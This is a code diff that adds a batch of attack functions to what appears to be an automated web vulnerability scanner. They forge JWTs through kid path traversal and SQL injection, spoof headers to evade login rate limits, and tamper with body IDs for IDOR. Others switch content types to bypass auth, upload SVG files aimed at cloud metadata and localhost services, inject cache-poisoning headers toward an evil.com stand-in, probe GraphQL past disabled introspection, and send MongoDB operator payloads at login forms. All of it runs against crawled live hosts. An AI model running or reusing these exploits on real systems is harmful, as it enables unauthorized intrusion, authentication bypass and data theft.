@@ -8114,3 +8114,431 @@ def scan_ssrf_redirect_chain(crawl_data):
                     })
             except: continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 12: JWT kid injection, rate limit bypass via headers,
+#                 IDOR in JSON body, auth bypass via content-type,
+#                 SSRF via SVG, NoSQL operator injection,
+#                 unkeyed cache poisoning, GraphQL alias introspection bypass,
+#                 CORS with Vary:Origin, API rate limit header rotation
+# ---------------------------------------------------------------------------
+
+def scan_jwt_kid_injection(crawl_data):
+    """JWT kid (Key ID) parameter injection — path traversal and SQL injection in kid."""
+    import base64 as _b64, json as _j, hmac as _hm, hashlib as _hl
+    findings = []
+    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            sources = list(r.cookies.values()) + [r.headers.get("Authorization", ""), r.text[:2000]]
+            for src in sources:
+                for jwt in jwt_re.findall(str(src)):
+                    parts = jwt.split(".")
+                    if len(parts) != 3: continue
+                    try:
+                        pad = lambda s: s + "=" * (-len(s) % 4)
+                        header = _j.loads(_b64.urlsafe_b64decode(pad(parts[0])))
+                        payload = _j.loads(_b64.urlsafe_b64decode(pad(parts[1])))
+                        if "kid" not in header: continue
+
+                        base_url = "/".join(page["url"].split("/", 3)[:3])
+
+                        # Test 1: kid path traversal — point to /dev/null (empty key)
+                        new_header = dict(header)
+                        new_header["kid"] = "../../dev/null"
+                        new_header_b64 = _b64.urlsafe_b64encode(
+                            _j.dumps(new_header, separators=(",",":")).encode()
+                        ).rstrip(b"=").decode()
+                        # Sign with empty key
+                        msg = f"{new_header_b64}.{parts[1]}".encode()
+                        sig = _hm.new(b"", msg, _hl.sha256).digest()
+                        sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+                        forged = f"{new_header_b64}.{parts[1]}.{sig_b64}"
+
+                        r2 = _S.get(page["url"], timeout=5,
+                                   headers={"Authorization": f"Bearer {forged}"})
+                        if r2.status_code == 200 and r2.status_code != r.status_code:
+                            findings.append({
+                                "type": "JWT kid Path Traversal (Empty Key)",
+                                "severity": "critical",
+                                "url": page["url"],
+                                "detail": "kid=../../dev/null accepted — JWT signed with empty key",
+                                "template": "apex-jwt-kid",
+                            })
+
+                        # Test 2: kid SQL injection
+                        new_header["kid"] = "' UNION SELECT 'secret'--"
+                        new_header_b64 = _b64.urlsafe_b64encode(
+                            _j.dumps(new_header, separators=(",",":")).encode()
+                        ).rstrip(b"=").decode()
+                        msg = f"{new_header_b64}.{parts[1]}".encode()
+                        sig = _hm.new(b"secret", msg, _hl.sha256).digest()
+                        sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+                        forged_sql = f"{new_header_b64}.{parts[1]}.{sig_b64}"
+                        r3 = _S.get(page["url"], timeout=5,
+                                   headers={"Authorization": f"Bearer {forged_sql}"})
+                        if r3.status_code == 200:
+                            findings.append({
+                                "type": "JWT kid SQL Injection",
+                                "severity": "critical",
+                                "url": page["url"],
+                                "detail": "kid parameter accepts SQL — JWT key fetched from DB via SQLi",
+                                "template": "apex-jwt-kid",
+                            })
+                    except: pass
+        except: pass
+    return findings
+
+
+def scan_rate_limit_bypass_headers(crawl_data):
+    """Bypass rate limiting via IP spoofing headers — rotate X-Forwarded-For."""
+    findings = []
+    tested = set()
+    spoof_headers = [
+        "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
+        "True-Client-IP", "CF-Connecting-IP", "X-Originating-IP",
+    ]
+    for page in crawl_data.get("pages", []):
+        if not any(x in page["url"].lower() for x in ["login", "auth", "api", "forgot", "reset"]):
+            continue
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+
+        for path in ["/login", "/api/login", "/auth", "/api/auth", "/forgot-password"]:
+            url = f"{base}{path}"
+            try:
+                # First: hit rate limit
+                blocked = False
+                for i in range(20):
+                    r = _S.post(url, json={"email": "test@test.com", "password": "wrong"},
+                               timeout=3)
+                    if r.status_code == 429 or "rate" in r.text.lower():
+                        blocked = True
+                        break
+
+                if not blocked: continue
+
+                # Now try bypass with rotating IPs
+                for header in spoof_headers:
+                    import random
+                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                    r_bypass = _S.post(url,
+                                      json={"email": "test@test.com", "password": "wrong"},
+                                      timeout=5, headers={header: fake_ip})
+                    if r_bypass.status_code != 429 and "rate" not in r_bypass.text.lower():
+                        findings.append({
+                            "type": f"Rate Limit Bypass via {header}",
+                            "severity": "high",
+                            "url": url,
+                            "detail": f"{header}: {fake_ip} bypasses rate limiting — brute force possible",
+                            "template": "apex-ratelimit-bypass",
+                        })
+                        break
+            except: continue
+    return findings
+
+
+def scan_idor_json_body(crawl_data):
+    """IDOR in POST/PUT JSON body — user_id, account_id in request body."""
+    findings = []
+    id_fields = ("user_id", "userId", "account_id", "accountId", "id", "owner_id",
+                 "ownerId", "customer_id", "customerId", "profile_id", "profileId")
+    for form in crawl_data.get("forms", []):
+        if form.get("method", "").upper() not in ("POST", "PUT", "PATCH"): continue
+        action = form.get("action", "")
+        if not action: continue
+        inputs = form.get("inputs", [])
+        for inp in inputs:
+            name = inp.get("name", "")
+            if name.lower() not in id_fields: continue
+            orig_val = inp.get("value", "1")
+            try:
+                # Get baseline with original ID
+                data = {i.get("name","f"): i.get("value","test") for i in inputs}
+                r_orig = _S.post(action, json=data, timeout=5)
+                # Try different IDs
+                for test_id in ["1", "2", "3", str(int(orig_val or "1") + 1)]:
+                    if test_id == str(orig_val): continue
+                    data[name] = test_id
+                    r_test = _S.post(action, json=data, timeout=5)
+                    if (r_test.status_code == 200 and
+                            r_test.text != r_orig.text and
+                            len(r_test.content) > 50):
+                        findings.append({
+                            "type": f"IDOR in JSON Body: {name}",
+                            "severity": "high",
+                            "url": action,
+                            "detail": f"Changing {name} from {orig_val} to {test_id} returns different data",
+                            "template": "apex-idor-json",
+                        })
+                        break
+            except: continue
+    return findings
+
+
+def scan_auth_bypass_content_type(crawl_data):
+    """Auth bypass via Content-Type manipulation — JSON vs form-encoded validation differences."""
+    findings = []
+    for form in crawl_data.get("forms", []):
+        if form.get("method", "").upper() != "POST": continue
+        action = form.get("action", "").lower()
+        if not any(x in action for x in ["login", "auth", "signin", "admin"]): continue
+        inputs = form.get("inputs", [])
+        data = {i.get("name","f"): i.get("value","test") for i in inputs}
+
+        try:
+            # Baseline: form-encoded
+            r_form = _S.post(form["action"], data=data, timeout=5)
+            # Test 1: JSON content-type
+            r_json = _S.post(form["action"], json=data, timeout=5,
+                            headers={"Content-Type": "application/json"})
+            # Test 2: XML content-type
+            xml_body = "<root>" + "".join(f"<{k}>{v}</{k}>" for k,v in data.items()) + "</root>"
+            r_xml = _S.post(form["action"], data=xml_body, timeout=5,
+                           headers={"Content-Type": "application/xml"})
+            # Test 3: Multipart
+            r_multi = _S.post(form["action"], files={k: (None, v) for k,v in data.items()}, timeout=5)
+
+            for r_test, ctype in [(r_json, "JSON"), (r_xml, "XML"), (r_multi, "Multipart")]:
+                if (r_test.status_code == 200 and r_form.status_code != 200):
+                    findings.append({
+                        "type": f"Auth Bypass via Content-Type ({ctype})",
+                        "severity": "critical",
+                        "url": form["action"],
+                        "detail": f"{ctype} content-type bypasses auth check that blocks form-encoded",
+                        "template": "apex-ct-bypass",
+                    })
+                elif (r_test.status_code != r_form.status_code and
+                      r_test.status_code in (200, 302)):
+                    findings.append({
+                        "type": f"Different Response for Content-Type ({ctype})",
+                        "severity": "medium",
+                        "url": form["action"],
+                        "detail": f"{ctype} returns {r_test.status_code} vs form-encoded {r_form.status_code}",
+                        "template": "apex-ct-bypass",
+                    })
+        except: continue
+    return findings
+
+
+def scan_ssrf_via_svg(crawl_data):
+    """SSRF via SVG upload — SVG with external entity or href."""
+    findings = []
+    ssrf_targets = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:22",
+        "http://localhost:6379",  # Redis
+        "http://localhost:27017",  # MongoDB
+    ]
+    for target in ssrf_targets[:2]:
+        svg_ssrf = f"""<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image href="{target}" height="100" width="100"/>
+</svg>""".encode()
+
+        for form in crawl_data.get("forms", []):
+            file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
+            if not file_inputs: continue
+            action = form.get("action", "")
+            if not action: continue
+            try:
+                files = {file_inputs[0].get("name", "file"): ("test.svg", svg_ssrf, "image/svg+xml")}
+                r = _S.post(action, files=files, timeout=8)
+                if any(x in r.text for x in ["ami-id", "instance-id", "ssh-", "root:", "redis"]):
+                    findings.append({
+                        "type": "SSRF via SVG Upload",
+                        "severity": "critical",
+                        "url": action,
+                        "detail": f"SVG with external href reaches {target}",
+                        "template": "apex-ssrf-svg",
+                    })
+                    break
+            except: continue
+    return findings
+
+
+def scan_unkeyed_cache_poisoning(crawl_data):
+    """Web cache poisoning via unkeyed headers — headers not in cache key but reflected."""
+    findings = []
+    tested = set()
+    # Headers that are often unkeyed but reflected
+    unkeyed_headers = [
+        ("X-Forwarded-Host", "apex-cache-poison.evil.com"),
+        ("X-Forwarded-Scheme", "https://apex-cache-poison.evil.com"),
+        ("X-Original-URL", "/apex-cache-poison"),
+        ("X-Rewrite-URL", "/apex-cache-poison"),
+        ("X-Forwarded-Port", "1337"),
+        ("X-Host", "apex-cache-poison.evil.com"),
+        ("X-Forwarded-Server", "apex-cache-poison.evil.com"),
+        ("Forwarded", "host=apex-cache-poison.evil.com"),
+    ]
+    for page in crawl_data.get("pages", [])[:5]:
+        url = page["url"]
+        base = "/".join(url.split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            baseline = _S.get(url, timeout=5)
+        except: continue
+
+        for header, value in unkeyed_headers:
+            try:
+                r = _S.get(url, timeout=5, headers={header: value})
+                # Check if value is reflected in response
+                if "apex-cache-poison" in r.text and "apex-cache-poison" not in baseline.text:
+                    # Check if response is cacheable
+                    cache_control = r.headers.get("Cache-Control", "")
+                    age = r.headers.get("Age", "")
+                    cf_cache = r.headers.get("CF-Cache-Status", "")
+                    is_cacheable = (
+                        "no-store" not in cache_control and
+                        "private" not in cache_control
+                    )
+                    sev = "critical" if is_cacheable else "high"
+                    findings.append({
+                        "type": f"Unkeyed Cache Poisoning via {header}",
+                        "severity": sev,
+                        "url": url,
+                        "detail": f"{header}: {value} reflected in response — {'cacheable' if is_cacheable else 'not cached but reflected'}",
+                        "template": "apex-cache-unkeyed",
+                    })
+                    break
+            except: continue
+    return findings
+
+
+def scan_graphql_alias_introspection(crawl_data):
+    """Bypass disabled GraphQL introspection via alias batching and field suggestion."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql", "/api/graphql", "/gql"]:
+            url = f"{base}{path}"
+            try:
+                # Check if introspection is disabled
+                r = _S.post(url, json={"query": "{__schema{types{name}}}"},
+                           headers={"Content-Type": "application/json"}, timeout=5)
+                if "__schema" in r.text: continue  # Introspection enabled, skip
+
+                if r.status_code not in (200, 400): continue
+
+                # Bypass 1: Use __type instead of __schema
+                r2 = _S.post(url, json={"query": "{__type(name:\"Query\"){fields{name}}}"},
+                            headers={"Content-Type": "application/json"}, timeout=5)
+                if "fields" in r2.text and "__type" not in r2.text:
+                    import json as _j
+                    try:
+                        data = _j.loads(r2.text)
+                        fields = [f["name"] for f in
+                                  data.get("data",{}).get("__type",{}).get("fields",[]) or []]
+                        if fields:
+                            findings.append({
+                                "type": "GraphQL Introspection Bypass via __type",
+                                "severity": "medium",
+                                "url": url,
+                                "detail": f"Schema leaked via __type despite disabled introspection: {', '.join(fields[:10])}",
+                                "template": "apex-gql-bypass",
+                            })
+                    except: pass
+
+                # Bypass 2: Clairvoyance-style — probe with common type names
+                for type_name in ["User", "Admin", "Query", "Mutation", "Account", "Payment"]:
+                    r3 = _S.post(url,
+                                json={"query": f'{{__type(name:"{type_name}"){{fields{{name type{{name}}}}}}}}'},
+                                headers={"Content-Type": "application/json"}, timeout=3)
+                    if r3.status_code == 200 and "fields" in r3.text:
+                        try:
+                            data = _j.loads(r3.text)
+                            fields = data.get("data",{}).get("__type",{})
+                            if fields and fields.get("fields"):
+                                field_names = [f["name"] for f in fields["fields"][:5]]
+                                findings.append({
+                                    "type": f"GraphQL Type Disclosure: {type_name}",
+                                    "severity": "medium",
+                                    "url": url,
+                                    "detail": f"Type {type_name} fields: {', '.join(field_names)}",
+                                    "template": "apex-gql-bypass",
+                                })
+                        except: pass
+            except: continue
+    return findings
+
+
+def scan_nosql_operator_injection(crawl_data):
+    """NoSQL injection via MongoDB operators in JSON body and query params."""
+    findings = []
+    # MongoDB operator payloads
+    nosql_payloads = [
+        {"$gt": ""},
+        {"$ne": "invalid_xyz"},
+        {"$regex": ".*"},
+        {"$where": "1==1"},
+        {"$exists": True},
+    ]
+    success_indicators = ["welcome", "dashboard", "logged", "token", "success",
+                          "user", "profile", "account", "home"]
+    error_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "unauthorized"]
+
+    # Test forms
+    for form in crawl_data.get("forms", []):
+        if form.get("method", "").upper() != "POST": continue
+        action = form.get("action", "")
+        if not action: continue
+        inputs = form.get("inputs", [])
+        auth_inputs = [i for i in inputs if i.get("type") in ("text", "email", "password")
+                       or any(x in i.get("name","").lower() for x in ("user","email","pass","login"))]
+        if not auth_inputs: continue
+
+        try:
+            # Baseline with wrong creds
+            baseline_data = {i.get("name","f"): "wrong_value_xyz" for i in inputs}
+            baseline = _S.post(action, json=baseline_data, timeout=5)
+            baseline_body = baseline.text.lower()
+
+            for payload in nosql_payloads:
+                data = dict(baseline_data)
+                for inp in auth_inputs:
+                    data[inp.get("name","f")] = payload
+                r = _S.post(action, json=data, timeout=5,
+                           headers={"Content-Type": "application/json"})
+                body = r.text.lower()
+                if (r.status_code in (200, 302) and
+                        any(x in body for x in success_indicators) and
+                        not any(x in body for x in error_indicators) and
+                        r.text != baseline.text):
+                    findings.append({
+                        "type": "NoSQL Injection (MongoDB Operator)",
+                        "severity": "critical",
+                        "url": action,
+                        "detail": f"Operator {list(payload.keys())[0]} bypasses authentication",
+                        "template": "apex-nosql-op",
+                    })
+                    break
+        except: continue
+
+    # Test GET params
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload_str in ["[$ne]=invalid", "[$gt]=", "[$regex]=.*"]:
+                try:
+                    test_url = f"{url.split('?')[0]}?{p}{payload_str}"
+                    r = _S.get(test_url, timeout=5)
+                    if r.status_code == 200 and len(r.content) > 100:
+                        findings.append({
+                            "type": "NoSQL Injection (GET Operator)",
+                            "severity": "high",
+                            "url": test_url,
+                            "detail": f"MongoDB operator in param {p} returns data",
+                            "template": "apex-nosql-op",
+                        })
+                        break
+                except: continue
+    return findings
